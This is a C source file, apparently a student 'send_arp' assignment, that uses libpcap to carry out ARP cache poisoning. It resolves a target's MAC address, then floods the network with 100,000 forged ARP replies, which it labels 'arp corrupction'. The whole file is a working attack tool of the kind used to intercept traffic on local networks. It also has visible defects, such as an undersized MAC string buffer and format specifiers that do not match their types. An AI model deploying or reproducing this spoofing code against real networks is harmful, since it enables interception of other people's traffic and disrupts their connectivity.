#include <pcap.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

#include "packetheaderstructure.h"

void usage()
{
  printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
}

int main(int argc, char** argv)
{
  if (argc != 4) // send_arp <interface> <sender ip> <target ip>
  {
    usage();
    return -1;
  }

  unsigned char macString[17] = "";
  getMacAddress(argv[1],macString); // get mac address
  unsigned char macArray[6];

  sscanf( (const char *)macString, "%02x:%02x:%02x:%02x:%02x:%02x", &macArray[0], &macArray[1], &macArray[2], &macArray[3], &macArray[4], &macArray[5]);

  char* dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

  if (handle == nullptr)
  {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }

  unsigned char packetdatas[42];

  long long argvMiddler2 = ipConvertInt(argv[2]);
  long long argvMiddler3 = ipConvertInt(argv[3]);


  memcpy(packetdatas,generatePacket1(macArray,argvMiddler2,argvMiddler3),42);

  printf("Request Mac Address\n");


  if(pcap_sendpacket(handle, packetdatas, sizeof(packetData))==0)
      printf("Success Request\n");




  packetData captured;

  memcpy(&captured,&packetdatas,sizeof(struct packetData));

  u_int8_t targetMacAddress[6];

  printf("find Target... \n");

  while (true)
  {
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res = pcap_next_ex(handle, &header, &packet);

     printf("packet start : ");



    if((packet[12] << 8 | packet[13]) == 0x806)
    {
        printf("find ARP Header\n");
        int isMacEqual = 0;
        for (int i=0;i<4;i++)
        {
            if(packet[0x26+i] != captured.arpheader.senderIP[i])
            {
                isMacEqual = -1;
            }
            else
            {
            }
        }
        printf("\n");

        if(isMacEqual == 0)
        {
            for (int i=0;i<6;i++)
            {
                targetMacAddress[i] = packet[0x16+i];
            }
            printf("find Target Mac\n");
            break;
        }
    }

    if (res == 0)
       continue;
    if (res == -1 || res == -2)
       break;
  }

  for (int i=0;i<6;i++)
  {
      printf("%02x:",targetMacAddress[i]);
  }
  printf("\n");

  printf("arp corrupction execute!!!\n");

  int i=0;

    memcpy(packetdatas,generatePacket2(macArray,targetMacAddress,argvMiddler2,argvMiddler3),42);
    while(i<100000)
    {
      if(pcap_sendpacket(handle, packetdatas, sizeof(packetData))==0)
       printf("Success Reply\n");
     i+=1;
    }

  printf("arp corrupction done\n");

}
